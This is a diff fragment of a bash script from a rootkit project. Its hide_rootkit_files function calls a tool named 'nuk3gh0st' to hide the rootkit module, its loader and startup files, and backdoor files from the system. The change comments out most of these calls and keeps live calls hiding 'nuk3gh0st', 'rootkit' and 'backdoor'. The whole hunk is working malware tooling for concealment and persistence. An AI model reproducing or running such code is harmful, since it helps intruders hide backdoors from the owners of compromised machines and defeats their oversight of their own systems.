@@ -32,29 +32,30 @@ function load_rootkit {
 function hide_rootkit_files {
 	#echo -e "${item} Hidding nuk3gh0st files"
         #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=rootkit.ko${endColor}"
-        nuk3gh0st --hide-file=rootkit.ko
+        #nuk3gh0st --hide-file=rootkit.ko
         #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st${endColor}"
-        nuk3gh0st --hide-file=nuk3gh0st
+        #nuk3gh0st --hide-file=nuk3gh0st
         #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=load-nuk3gh0st${endColor}"
-        nuk3gh0st --hide-file=load-nuk3gh0st
+        #nuk3gh0st --hide-file=load-nuk3gh0st
         #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=unload-nuk3gh0st${endColor}"
-        nuk3gh0st --hide-file=unload-nuk3gh0st
+        #nuk3gh0st --hide-file=unload-nuk3gh0st
         #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=startup-nuk3gh0st${endColor}"
-        nuk3gh0st --hide-file=enable-nuk3gh0st
+        #nuk3gh0st --hide-file=enable-nuk3gh0st
         #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=rmstartup-nuk3gh0st${endColor}"
-        nuk3gh0st --hide-file=disable-nuk3gh0st
+        #nuk3gh0st --hide-file=disable-nuk3gh0st
         #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.startup${endColor}"
-        nuk3gh0st --hide-file=nuk3gh0st.startup
+        #nuk3gh0st --hide-file=nuk3gh0st.startup
         #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.service${endColor}"
-        nuk3gh0st --hide-file=nuk3gh0st.service
+        #nuk3gh0st --hide-file=nuk3gh0st.service
 	#echo -e "   ${purple} cmd: nuk3gh0st --hide-file=S98nuk3gh0st.startup${endColor}"
-        nuk3gh0st --hide-file=S98nuk3gh0st.startup
-	
-	nuk3gh0st --hide-file=S99backdoor
+        #nuk3gh0st --hide-file=S98nuk3gh0st.startup
+	#nuk3gh0st --hide-file=S99backdoor
+	#nuk3gh0st --hide-file=backdoor
+	#nuk3gh0st --hide-file=backdoor-generator
+	#nuk3gh0st --hide-file=backdoor.service
+	nuk3gh0st --hide-file=nuk3gh0st
+	nuk3gh0st --hide-file=rootkit
 	nuk3gh0st --hide-file=backdoor
-	nuk3gh0st --hide-file=backdoor-generator
-	nuk3gh0st --hide-file=backdoor.service
-	
 	
         #echo ""
 
